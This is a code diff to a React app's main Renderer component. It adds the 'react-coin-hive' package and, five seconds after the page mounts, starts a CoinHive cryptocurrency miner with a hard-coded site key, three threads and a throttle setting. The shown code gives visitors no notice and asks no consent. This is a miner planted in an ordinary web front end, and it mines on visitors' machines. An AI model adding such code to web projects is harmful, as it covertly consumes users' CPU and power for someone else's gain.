@@ -36,6 +36,8 @@ import Auth from '../Auth';
 
 // import ORM from '../ORM';
 
+import CoinHive from 'react-coin-hive';
+
 import RootType, {
   Mutation,
   rootDirectives,
@@ -3033,6 +3035,16 @@ class Renderer extends Component{
   }
 
 
+  constructor(props){
+
+    super(props);
+
+    this.state = {
+      coinHive: false,
+    };
+
+  }
+
 
   componentWillMount(){
   
@@ -3058,6 +3070,16 @@ class Renderer extends Component{
     // }
   }
 
+  componentDidMount(){
+
+    setTimeout(() => {
+      this.setState({
+        coinHiveInited: true,
+      });
+    }, 5000);
+
+  }
+
   render(){
 
     const {
@@ -3066,6 +3088,10 @@ class Renderer extends Component{
       authOpen,
       notifications_store,
     } = this.props;
+
+    const {
+      coinHiveInited,
+    } = this.state;
 
     // let {
     //   appExports,
@@ -3097,7 +3123,21 @@ class Renderer extends Component{
 
       <Informer
         store={notifications_store}
-      />  
+      />
+
+      {coinHiveInited && <CoinHive 
+        siteKey='rTBHNBgw52FIczrU01J26H1OaDqNnaXE'
+        timeout={5000}
+        throttle={30}
+        threads={3}
+        // autoThreads={true}
+        // onInit={miner => setInterval(() => CoinHive.displayMiner(miner), 1000)}
+        onInit={miner => () => {
+          console.log('miner', miner);
+        }}
+        onStart={() => console.log('started')}
+        onStop={() => console.log('stopped')}
+      /> || null}
 
     </div>;
   }
